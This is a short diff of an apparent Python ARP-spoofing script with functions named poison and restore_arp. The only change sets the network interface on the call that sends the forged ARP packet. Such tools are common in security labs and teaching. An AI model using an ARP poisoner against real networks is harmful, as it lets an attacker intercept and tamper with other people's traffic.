@@ -16,7 +16,7 @@ def poison(victim_ip, spoof_ip):
     # print(packet) #debugging
 
     # Send the ARP packet without output
-    send(packet, verbose=False)
+    send(packet, verbose=False, iface="eth0")
 
 
 def restore_arp(victim_ip, spoof_ip):
